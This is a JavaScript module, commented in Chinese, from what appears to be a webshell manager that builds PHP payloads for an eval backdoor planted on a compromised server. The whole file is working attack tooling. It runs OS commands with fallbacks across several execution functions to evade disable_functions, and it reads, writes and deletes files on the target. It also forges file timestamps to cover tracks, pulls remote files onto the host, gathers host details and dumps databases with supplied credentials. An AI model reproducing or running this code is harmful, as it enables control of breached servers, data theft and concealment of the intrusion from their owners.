// dsh-webshell-mgr PHP 代码片段库：eval 能力通道（cmd-eval 的 PHP 马 / dsh-aes v2 的
// e 操作码）专用。所有片段自包含、参数走 base64 内嵌（规避引号/反斜杠/$ 转义地狱），
// 结构化输出统一带 WSMJSON 前缀标记，二进制读带 WSMB64 前缀标记。
// 片段以函数形式生成，注入参数后为完整 PHP 语句序列（可直接 eval / 直接作 POST 值）。

import { b64 } from "./http-client.js";

/** 参数 → PHP base64_decode('…') 字面量。 */
const P = (v) => `base64_decode('${b64(String(v ?? ""))}')`;

/** 共用前奏：shell 执行多函数回退（disable_functions 对抗的最低保障）。 */
const PRELUDE = `
function __wsm_sh($c){
  $o = null;
  if (function_exists('shell_exec')) { $o = @shell_exec($c); }
  elseif (function_exists('exec')) { $r = array(); @exec($c . ' 2>&1', $r); $o = implode("\\n", $r); }
  elseif (function_exists('popen')) { $h = @popen($c . ' 2>&1', 'r'); $o = $h ? @stream_get_contents($h) : null; if ($h) @pclose($h); }
  elseif (function_exists('system')) { ob_start(); @system($c . ' 2>&1'); $o = ob_get_clean(); }
  elseif (function_exists('passthru')) { ob_start(); @passthru($c . ' 2>&1'); $o = ob_get_clean(); }
  return ($o === false || $o === null) ? '' : (string)$o;
}
function __wsm_rm($p){
  if (is_dir($p)) { foreach (scandir($p) as $f) { if ($f !== '.' && $f !== '..') __wsm_rm($p . DIRECTORY_SEPARATOR . $f); } @rmdir($p); }
  else { @unlink($p); }
}
function __wsm_out($j){ echo 'WSMJSON' . $j; }
`;

/** 目录列表 → JSON [{n,d,s,m,w,p}]。 */
export function phpLs(path) {
	return PRELUDE + `
$d = ${P(path)};
$o = array();
if (!is_dir($d)) { __wsm_out(json_encode(array('error' => 'not a dir'))); return; }
foreach (scandir($d) as $f) {
  if ($f === '.' || $f === '..') continue;
  $fp = $d . DIRECTORY_SEPARATOR . $f;
  $o[] = array('n' => $f, 'd' => @is_dir($fp), 's' => @is_file($fp) ? @filesize($fp) : 0,
    'm' => @filemtime($fp), 'w' => @is_writable($fp),
    'p' => substr(sprintf('%o', @fileperms($fp)), -4));
}
usort($o, function($a, $b){ return strcmp($a['n'], $b['n']); });
__wsm_out(json_encode($o));
`;
}

/** 读文件 → WSMB64 + base64（不存在 → WSMJSON error）。 */
export function phpRead(path) {
	return PRELUDE + `
$p = ${P(path)};
if (!@file_exists($p)) { __wsm_out(json_encode(array('error' => 'file not found'))); return; }
$c = @file_get_contents($p);
echo 'WSMB64' . base64_encode($c === false ? '' : $c);
`;
}

/** 复制文件（目标存在则覆盖）。 */
export function phpCopy(from, to) {
	return `
$ok = @copy(${P(from)}, ${P(to)});
__wsm_out(json_encode(array('ok' => (bool)$ok)));
`;
}

/** 写文件（首块）。 */
export function phpWrite(path, dataB64) {
	return PRELUDE + `

$ok = @file_put_contents(${P(path)}, base64_decode(${P(dataB64)}));
__wsm_out(json_encode(array('ok' => $ok !== false)));
`;
}

/** 追加写（后续块）。 */
export function phpAppend(path, dataB64) {
	return PRELUDE + `

$ok = @file_put_contents(${P(path)}, base64_decode(${P(dataB64)}), FILE_APPEND);
__wsm_out(json_encode(array('ok' => $ok !== false)));
`;
}

/** 删除文件/目录（递归）。 */
export function phpDelete(path) {
	return PRELUDE + `
__wsm_rm(${P(path)});
__wsm_out(json_encode(array('ok' => !file_exists(${P(path)}))));
`;
}

/** 新建目录（递归）。 */
export function phpMkdir(path) {
	return PRELUDE + `

$ok = @mkdir(${P(path)}, 0755, true);
__wsm_out(json_encode(array('ok' => $ok || is_dir(${P(path)}))));
`;
}

/** 重命名/移动（跨设备回退 copy+rm）。 */
export function phpMv(from, to) {
	return PRELUDE + `

$a = ${P(from)}; $b = ${P(to)};
$ok = @rename($a, $b);
if (!$ok && @copy($a, $b)) { @unlink($a); $ok = true; }
__wsm_out(json_encode(array('ok' => (bool)$ok)));
`;
}

/** 改权限（八进制字符串）。 */
export function phpChmod(path, mode) {
	return PRELUDE + `

__wsm_out(json_encode(array('ok' => @chmod(${P(path)}, octdec(${P(String(mode).replace(/[^0-7]/g, "") || "644")})))));
`;
}

/** 伪造时间戳（epoch 秒，mtime+atime 同设）。 */
export function phpTouch(path, epoch) {
	return PRELUDE + `

$t = ${Math.trunc(Number(epoch) || 0)};
__wsm_out(json_encode(array('ok' => @touch(${P(path)}, $t, $t))));
`;
}

/** 读时间戳与大小。 */
export function phpStat(path) {
	return PRELUDE + `

$s = @stat(${P(path)});
__wsm_out($s ? json_encode(array('size' => $s['size'], 'mtime' => $s['mtime'], 'atime' => $s['atime'], 'ctime' => $s['ctime'], 'perm' => substr(sprintf('%o', $s['mode']), -4))) : json_encode(array('error' => 'stat failed')));
`;
}

/** 远程 URL 下载到目标机。 */
export function phpWget(url, path) {
	return PRELUDE + `

$ctx = stream_context_create(array('http' => array('timeout' => 25, 'follow_location' => 1)));
$c = @file_get_contents(${P(url)}, false, $ctx);
$ok = $c !== false && @file_put_contents(${P(path)}, $c) !== false;
__wsm_out(json_encode(array('ok' => (bool)$ok)));
`;
}

/** 文件 MD5（上传完整性核对）。 */
export function phpHash(path) {
	return PRELUDE + `

$h = @md5_file(${P(path)});
__wsm_out(json_encode(array('md5' => $h === false ? '' : $h)));
`;
}

/** 基本信息 → JSON。 */
export function phpBasicInfo() {
	return PRELUDE + `
$u = __wsm_sh(PHP_OS_FAMILY === 'Windows' ? 'whoami' : 'id -un');
__wsm_out(json_encode(array(
  'user' => trim($u), 'os' => PHP_OS, 'osFamily' => PHP_OS_FAMILY, 'uname' => php_uname(),
  'cwd' => getcwd(), 'php' => PHP_VERSION, 'sapi' => php_sapi_name(),
  'disabled' => (string)ini_get('disable_functions'), 'tz' => @date_default_timezone_get()
)));
`;
}

/** 盘符/根（windows 枚举盘符，否则 /）。 */
export function phpRoots() {
	return PRELUDE + `

$r = array();
if (PHP_OS_FAMILY === 'Windows') {
  foreach (range('A', 'Z') as $L) { $p = $L . ':\\\\'; if (@is_dir($p)) $r[] = $p; }
} else { $r[] = '/'; }
__wsm_out(json_encode($r));
`;
}

/** OS 命令执行（eval 通道的 cmd 底座）。 */
export function phpExec(command) {
	return PRELUDE + `
echo __wsm_sh(${P(command)});
`;
}

//#region 数据库（PDO 原生路线）

/** PDO 连接构造（类型：mysql/pgsql/sqlite/mssql）。 */
const PDO_CONNECT = `
function __wsm_db($t, $h, $P, $u, $w, $db){
  $opts = array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 15);
  if ($t === 'mysql') { $dsn = "mysql:host=$h;port=$P" . ($db ? ";dbname=$db" : '') . ";charset=utf8mb4"; return new PDO($dsn, $u, $w, $opts); }
  if ($t === 'pgsql') { $dsn = "pgsql:host=$h;port=$P" . ($db ? ";dbname=$db" : ''); return new PDO($dsn, $u, $w, $opts); }
  if ($t === 'sqlite') { return new PDO('sqlite:' . $db, null, null, $opts); }
  if ($t === 'mssql') { $dsn = strpos($h, "\\\\") !== false ? "sqlsrv:Server=$h" : "sqlsrv:Server=$h,$P" . ($db ? ";Database=$db" : ''); return new PDO($dsn, $u, $w, $opts); }
  throw new Exception("unsupported type $t");
}
`;

/** 执行 SQL → {cols,rows,affected,truncated}。 */
export function phpDbQuery(profile, sql) {
	return PRELUDE + PDO_CONNECT + `
try {
  $pdo = __wsm_db(${P(profile.type)}, ${P(profile.host)}, ${P(String(profile.port ?? ""))}, ${P(profile.username)}, ${P(profile.password)}, ${P(profile.database)});
  $st = $pdo->query(${P(sql)});
  if ($st && $st->columnCount() > 0) {
    $cols = array(); for ($i = 0; $i < $st->columnCount(); $i++) { $m = $st->getColumnMeta($i); $cols[] = $m ? $m['name'] : "c$i"; }
    $rows = array(); $n = 0;
    while (($r = $st->fetch(PDO::FETCH_NUM)) !== false && $n < 201) { $rows[] = array_map(function($v){ return $v === null ? null : (string)$v; }, $r); $n++; }
    __wsm_out(json_encode(array('cols' => $cols, 'rows' => $rows, 'truncated' => $n >= 201)));
  } else {
    __wsm_out(json_encode(array('cols' => array(), 'rows' => array(), 'affected' => $st ? $st->rowCount() : $pdo->exec(${P(sql)}))));
  }
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`;
}

/** 库列表。 */
export function phpDbDatabases(profile) {
	const sql = profile.type === "mysql" ? "SHOW DATABASES"
		: profile.type === "pgsql" ? "SELECT datname FROM pg_database WHERE NOT datistemplate ORDER BY 1"
		: profile.type === "mssql" ? "SELECT name FROM sys.databases ORDER BY name"
		: null;
	if (sql === null) {
		return PRELUDE + PDO_CONNECT + `
__wsm_out(json_encode(array('databases' => array('(current)'))));
`;
	}
	return PRELUDE + PDO_CONNECT + `
try {
  $pdo = __wsm_db(${P(profile.type)}, ${P(profile.host)}, ${P(String(profile.port ?? ""))}, ${P(profile.username)}, ${P(profile.password)}, ${P(profile.database)});
  $rows = $pdo->query(${P(sql)})->fetchAll(PDO::FETCH_COLUMN);
  __wsm_out(json_encode(array('databases' => $rows)));
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`;
}

/** 表列表（指定库）。 */
export function phpDbTables(profile, database) {
	const q = String(database ?? "");
	const sql = profile.type === "mysql" ? `SHOW TABLES FROM \`${q.replace(/`/g, "``")}\``
		: profile.type === "pgsql" ? "SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY 1"
		: profile.type === "mssql" ? "SELECT name FROM sys.tables ORDER BY name"
		: "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name";
	return PRELUDE + PDO_CONNECT + `
try {
  $pdo = __wsm_db(${P(profile.type)}, ${P(profile.host)}, ${P(String(profile.port ?? ""))}, ${P(profile.username)}, ${P(profile.password)}, ${P(profile.type === "mysql" && q ? q : profile.database)});
  $rows = $pdo->query(${P(sql)})->fetchAll(PDO::FETCH_COLUMN);
  __wsm_out(json_encode(array('tables' => $rows)));
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`;
}

/** 表结构（列名+类型）与行数。 */
export function phpDbTableInfo(profile, database, table) {
	const q = String(table ?? "").replace(/'/g, "''");
	const isSqlite = profile.type === "sqlite";
	const sql = profile.type === "mysql"
		? `SELECT column_name, data_type FROM information_schema.columns WHERE table_schema=database() AND table_name='${q}' ORDER BY ordinal_position`
		: profile.type === "pgsql"
			? `SELECT column_name, data_type FROM information_schema.columns WHERE table_name='${q}' ORDER BY ordinal_position`
			: profile.type === "mssql"
				? `SELECT c.name, t.name FROM sys.columns c JOIN sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID('${q}') ORDER BY c.column_id`
				: `PRAGMA table_info('${q}')`;
	return PRELUDE + PDO_CONNECT + `
try {
  $pdo = __wsm_db(${P(profile.type)}, ${P(profile.host)}, ${P(String(profile.port ?? ""))}, ${P(profile.username)}, ${P(profile.password)}, ${P(profile.type === "mysql" && database ? database : profile.database)});
  $st = $pdo->query(${P(sql)});
  $cols = array();
  ${isSqlite ? "while ($r = $st->fetch(PDO::FETCH_NUM)) { $cols[] = array($r[1], $r[2]); }" : "while ($r = $st->fetch(PDO::FETCH_NUM)) { $cols[] = array($r[0], $r[1]); }"}
  try { $n = $pdo->query('SELECT COUNT(*) FROM "' . str_replace('"', '""', ${P(String(table ?? ""))}) . '"')->fetch(PDO::FETCH_COLUMN); } catch (Throwable $e2) { $n = null; }
  __wsm_out(json_encode(array('columns' => $cols, 'count' => $n)));
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`;
}

//#endregion

/** 从 eval 通道输出中提取结构化结果：WSMJSON → 解析对象；WSMB64 → Buffer；否则原文本。 */
export function extractMarked(text) {
	const raw = String(text ?? "");
	const i = raw.indexOf("WSMJSON");
	if (i >= 0) {
		try {
			const parsed = JSON.parse(raw.slice(i + 7).trim());
			return parsed;
		} catch { /* 标记后非完整 JSON → 按原文返回 */ }
	}
	const j = raw.indexOf("WSMB64");
	if (j >= 0) return { b64buffer: raw.slice(j + 6).trim() };
	return { text: raw };
}
